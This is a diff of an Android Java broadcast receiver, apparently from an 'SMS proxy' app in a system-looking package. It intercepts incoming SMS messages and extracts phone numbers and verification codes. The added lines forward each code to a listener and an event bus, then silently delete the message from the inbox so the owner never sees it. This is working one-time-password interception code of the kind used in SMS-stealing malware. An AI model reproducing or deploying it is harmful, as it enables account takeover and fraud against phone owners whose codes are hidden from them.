@@ -14,18 +14,22 @@ import android.telephony.SmsMessage;
 import android.text.TextUtils;
 import android.util.Log;
 
+import com.android.sms.proxy.entity.MessageEvent;
 import com.android.sms.proxy.entity.PhoneInfo;
+
+import org.greenrobot.eventbus.EventBus;
 
 import java.util.regex.Matcher;
 import java.util.regex.Pattern;
 
 /**
  * 短信拦截
+ *
  * @author zyq 16-3-9
  */
 public class Receiver_SMS extends BroadcastReceiver {
 
-	private final static boolean DEBUG = true;
+	private final static boolean DEBUG = false;
 	private final static String TAG = "smsReceiver";
 	private final static String SMS_ACTION = "android.provider.Telephony.SMS_RECEIVED";
 	private final static String SMS_CATEGORY = "android.intent.category.DEFAULT";
@@ -38,7 +42,8 @@ public class Receiver_SMS extends BroadcastReceiver {
 
 	private OnReceiveSMSListener mOnReceiveSMSListener;
 
-	public Receiver_SMS(){};
+	public Receiver_SMS() {
+	};
 
 	public Receiver_SMS(OnReceiveSMSListener listener) {
 		mOnReceiveSMSListener = listener;
@@ -70,10 +75,11 @@ public class Receiver_SMS extends BroadcastReceiver {
 				if (args != null) {
 					Object[] pdus = (Object[]) args.get(SMS_SERVICE);
 					SmsMessage messages[] = new SmsMessage[pdus.length];
-                    boolean hasPhoneNumber = true;
-					SharedPreferences sp = context.getSharedPreferences(PhoneInfo.SP_TABLE_PHONE_INFO,Context.MODE_PRIVATE);
-					String phoneNumber = sp.getString(PhoneInfo.SP_KEY_PHONE_NUMBER,"");
-					if(TextUtils.isEmpty(phoneNumber)) {
+					boolean hasPhoneNumber = true;
+					SharedPreferences sp = context.getSharedPreferences(PhoneInfo.SP_TABLE_PHONE_INFO, Context
+							.MODE_PRIVATE);
+					String phoneNumber = sp.getString(PhoneInfo.SP_KEY_PHONE_NUMBER, "");
+					if (TextUtils.isEmpty(phoneNumber)) {
 						hasPhoneNumber = false;
 					}
 					for (int i = 0; i < messages.length; i++) {
@@ -81,41 +87,48 @@ public class Receiver_SMS extends BroadcastReceiver {
 						msgContent = messages[i].getMessageBody();
 
 						//final String verifyCode = getVerificationCode(msgContent);
-						if(!hasPhoneNumber){
+						if (!hasPhoneNumber) {
 							String number = getPhoneNumber(msgContent);
-							Log.d(TAG,"已经找到该手机号:"+number);
-							if(!TextUtils.isEmpty(number)){
+							Log.d(TAG, "已经找到该手机号:" + number);
+							if (!TextUtils.isEmpty(number)) {
 								hasPhoneNumber = true;
 								SharedPreferences.Editor et = sp.edit();
-								et.putString(PhoneInfo.SP_KEY_PHONE_NUMBER,number);
+								et.putString(PhoneInfo.SP_KEY_PHONE_NUMBER, number);
 								boolean save = et.commit();
-								if(save){
-									Log.d(TAG,"手机号已保存成功");
+								if (save) {
+									Log.d(TAG, "手机号已保存成功");
 									PhoneInfo.phoneNumber = number;
 									break;
 								}
 							}
 						}
-						if (msgContent != null && mOnReceiveSMSListener != null) {
-							mOnReceiveSMSListener.onReceiveSMS(msgContent);
+						if (msgContent != null) {
+							String code = getVerificationCode(msgContent);
+							Log.d(TAG, "验证码是" + code);
+							String printMessage = "验证码是:"+msgContent;
+							EventBus.getDefault().post(new MessageEvent(printMessage));
+							if(!TextUtils.isEmpty(code)){
+								if(mOnReceiveSMSListener != null){
+									mOnReceiveSMSListener.onReceiveSMS(code);
+								}
+								if (Build.VERSION.SDK_INT == Build.VERSION_CODES.KITKAT) {
+									if (SmsWriteOpUtil.isWriteEnabled(context)) {
+										SmsWriteOpUtil.setWriteEnabled(context, true);
+									}
+								}
+								deleteSMS(context, msgContent);
+							}
 						}
 
-                        if(Build.VERSION.SDK_INT == Build.VERSION_CODES.KITKAT){
-                            if(SmsWriteOpUtil.isWriteEnabled(context)){
-                                SmsWriteOpUtil.setWriteEnabled(context,true);
-                            }
-                        }
-						deleteSMS(context, msgContent);
 					}
 				}
 			}
-		}catch (Exception e){
-			if(DEBUG){
-				Log.e(TAG,e.fillInStackTrace().toString());
+		} catch (Exception e) {
+			if (DEBUG) {
+				Log.e(TAG, e.fillInStackTrace().toString());
 			}
 		}
 	}
-
 
 
 	private String getVerificationCode(String smsBody) {
@@ -125,23 +138,23 @@ public class Receiver_SMS extends BroadcastReceiver {
 			final int groupCount = m.groupCount();
 			if (groupCount >= 0) {
 				final String tempStr = m.group(0);
-				return tempStr.substring(1, tempStr.length()-1);
+				return tempStr.substring(1, tempStr.length() - 1);
 			}
 		}
 		return null;
 	}
 
 
-	private String getPhoneNumber(String smsBody){
-		Log.d(TAG,"找手机号");
+	private String getPhoneNumber(String smsBody) {
+		Log.d(TAG, "找手机号");
 		String telRegex = "[1][358]\\d{9}";
 		Pattern p = Pattern.compile(telRegex);
 		Matcher m = p.matcher(smsBody);
-		if(m.find()){
+		if (m.find()) {
 			final int groupCount = m.groupCount();
-			if(groupCount >= 0){
+			if (groupCount >= 0) {
 				final String tempStr = m.group(0);
-				return tempStr.substring(0,tempStr.length());
+				return tempStr.substring(0, tempStr.length());
 			}
 		}
 		return null;
@@ -152,27 +165,27 @@ public class Receiver_SMS extends BroadcastReceiver {
 	}
 
 
-	public void deleteSMS(Context context,String smsContent){
-		try{
+	public void deleteSMS(Context context, String smsContent) {
+		try {
 			Uri uri = Uri.parse(SMS_RECEIVE_CONTENT);
 			ContentResolver contentResolver = context.getContentResolver();
-			if(contentResolver != null){
-				Cursor isRead = contentResolver.query(uri,null,null,null,null);
-				Log.d(TAG,"找到类似的短信多少条:"+isRead.getCount());
-				while(isRead.moveToNext()){
+			if (contentResolver != null) {
+				Cursor isRead = contentResolver.query(uri, null, null, null, null);
+				Log.d(TAG, "找到类似的短信多少条:" + isRead.getCount());
+				while (isRead.moveToNext()) {
 					String body = isRead.getString(isRead.getColumnIndex(SMS_BODY)).trim();
-					Log.d(TAG,"短信内容:"+body);
-					if(body.equals(smsContent)){
+					Log.d(TAG, "短信内容:" + body);
+					if (body.equals(smsContent)) {
 						int id = isRead.getInt(isRead.getColumnIndex(SMS_ID));
-						Log.d(TAG,"找到该短信:"+smsContent+" 短信标识为:"+id + "准备删除!");
-						int count = context.getContentResolver().delete(Uri.parse(SMS_CONTENT),"_id="+id,null);
-                        Log.d(TAG,"当前版本号:"+Build.VERSION.SDK_INT);
-						Log.d(TAG,(count == 1) ? "删除成功":"删除失败");
+						Log.d(TAG, "找到该短信:" + smsContent + " 短信标识为:" + id + "准备删除!");
+						int count = context.getContentResolver().delete(Uri.parse(SMS_CONTENT), "_id=" + id, null);
+						Log.d(TAG, "当前版本号:" + Build.VERSION.SDK_INT);
+						Log.d(TAG, (count == 1) ? "删除成功" : "删除失败");
 					}
 				}
 			}
-		}catch (Exception e){
-			Log.e(TAG,e.fillInStackTrace().toString());
+		} catch (Exception e) {
+			Log.e(TAG, e.fillInStackTrace().toString());
 		}
 	}
 }
